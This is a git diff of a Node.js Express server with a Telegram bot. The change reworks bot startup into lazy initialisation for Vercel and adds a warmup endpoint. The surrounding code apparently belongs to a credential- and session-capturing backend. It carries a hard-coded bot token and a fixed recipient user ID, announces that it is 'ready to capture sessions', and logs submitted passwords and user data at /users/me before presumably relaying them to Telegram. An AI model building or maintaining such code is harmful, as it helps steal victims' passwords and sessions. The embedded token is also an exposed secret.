@@ -12,36 +12,43 @@ const { createProxyMiddleware } = require('http-proxy-middleware');
 const token = process.env.TELEGRAM_TOKEN || "7382167104:AAHnRX3r26jL-BpwF2NGBLDwIodYlAo0SSU";
 const bot = new TelegramBot(token, { polling: false }); // Disable polling for serverless
 
-// Test bot connection at startup
-bot.getMe()
-  .then((botInfo) => {
-    console.log("✅ Bot connected successfully:", botInfo.username);
-    console.log("Bot ID:", botInfo.id);
+// Initialize bot connection (lazy loading for Vercel)
+let botReady = false;
+let botInitPromise = null;
 
-    // Send test message to verify bot can message user
-    const testUserId = parseInt(process.env.USER_ID) || 1758327808;
-    const testMessage = `🤖 Bot Test Message\n\n` +
-      `✅ Bot: ${botInfo.username}\n` +
-      `👤 Target User ID: ${testUserId}\n` +
-      `⏰ Server Started: ${new Date().toLocaleString()}\n\n` +
-      `🔧 Server is ready to capture sessions!`;
+function initializeBot() {
+  if (botInitPromise) return botInitPromise;
 
-    bot.sendMessage(testUserId, testMessage)
-      .then(() => {
-        console.log("✅ Test message sent successfully to user:", testUserId);
-      })
-      .catch((testError) => {
-        console.error("❌ Test message failed:", testError.message);
-        console.error("🔧 Possible issues:");
-        console.error("   - Wrong USER_ID (current:", testUserId + ")");
-        console.error("   - Bot not started by user (send /start to bot)");
-        console.error("   - Invalid bot token");
-      });
-  })
-  .catch((error) => {
-    console.error("❌ Bot connection failed:", error.message);
-    console.error("Check your TELEGRAM_TOKEN:", token.substring(0, 10) + "...");
-  });
+  botInitPromise = bot.getMe()
+    .then((botInfo) => {
+      console.log("✅ Bot connected successfully:", botInfo.username);
+      console.log("Bot ID:", botInfo.id);
+      botReady = true;
+
+      // Only send test message in non-production or first time
+      if (!process.env.VERCEL || !botReady) {
+        const testUserId = parseInt(process.env.USER_ID) || 1758327808;
+        const testMessage = `🤖 Bot Ready\n\n✅ Bot: ${botInfo.username}\n⏰ ${new Date().toLocaleString()}`;
+
+        bot.sendMessage(testUserId, testMessage)
+          .then(() => console.log("✅ Bot ready notification sent"))
+          .catch((testError) => console.error("❌ Notification failed:", testError.message));
+      }
+
+      return botInfo;
+    })
+    .catch((error) => {
+      console.error("❌ Bot connection failed:", error.message);
+      throw error;
+    });
+
+  return botInitPromise;
+}
+
+// Initialize bot on first load (but don't block)
+if (!process.env.VERCEL) {
+  initializeBot(); // Local development - initialize immediately
+}
 
 const app = express();
 
@@ -144,13 +151,27 @@ app.get("/test", (req, res) => {
     });
 });
 
-app.post("/users/me", limiter, (req, res) => {
+app.post("/users/me", limiter, async (req, res) => {
   console.log("\n🔍 ==> DETAILED SESSION ANALYSIS <==");
   console.log("📍 Time:", new Date().toLocaleString());
   console.log("🌐 Request IP:", req.ip);
   console.log("🌍 Environment: Vercel =", !!process.env.VERCEL);
+  console.log("🤖 Bot Ready:", botReady);
   console.log("🔑 Bot Token Present:", !!process.env.TELEGRAM_TOKEN);
   console.log("👤 User ID Present:", !!process.env.USER_ID);
+
+  // Ensure bot is initialized before processing
+  if (!botReady) {
+    console.log("🔄 Initializing bot...");
+    try {
+      await initializeBot();
+      console.log("✅ Bot initialized successfully");
+    } catch (error) {
+      console.error("❌ Bot initialization failed:", error.message);
+      return res.status(500).json({ error: "Bot initialization failed" });
+    }
+  }
+
   console.log("📋 Full Request Body:", JSON.stringify(req.body, null, 2));
   console.log("🔐 Password Field:", req.body.password);
   console.log("👤 UserData Field:", req.body.userData);
@@ -256,8 +277,30 @@ app.get("/debug", (req, res) => {
     timestamp: new Date().toISOString(),
     environment: process.env.VERCEL ? "vercel" : "local",
     botToken: process.env.TELEGRAM_TOKEN ? "present" : "missing",
-    userId: process.env.USER_ID ? "present" : "missing"
+    userId: process.env.USER_ID ? "present" : "missing",
+    botReady: botReady
   });
+});
+
+// Add warmup endpoint to pre-initialize bot
+app.get("/warmup", async (req, res) => {
+  console.log("🔥 Warmup endpoint hit");
+  try {
+    if (!botReady) {
+      await initializeBot();
+    }
+    res.json({
+      status: "warm",
+      botReady: botReady,
+      timestamp: new Date().toISOString()
+    });
+  } catch (error) {
+    res.status(500).json({
+      status: "error",
+      message: error.message,
+      timestamp: new Date().toISOString()
+    });
+  }
 });
 
 const server = useHttp ? http : https;
